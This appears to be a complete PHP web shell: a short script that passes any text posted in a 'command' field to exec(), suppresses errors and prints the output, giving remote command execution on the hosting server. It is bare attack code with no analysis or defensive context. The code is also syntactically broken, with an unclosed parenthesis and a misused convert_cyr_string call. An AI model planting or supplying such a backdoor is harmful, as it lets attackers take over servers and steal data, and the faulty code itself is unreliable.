<?php
function shell($cmd) {
  	@exec($cmd,$ret);
	$ret = join("\n",$ret);
	return $ret;
}

echo convert_cyr_string(htmlspecialchars(shell($_POST['command']));
?>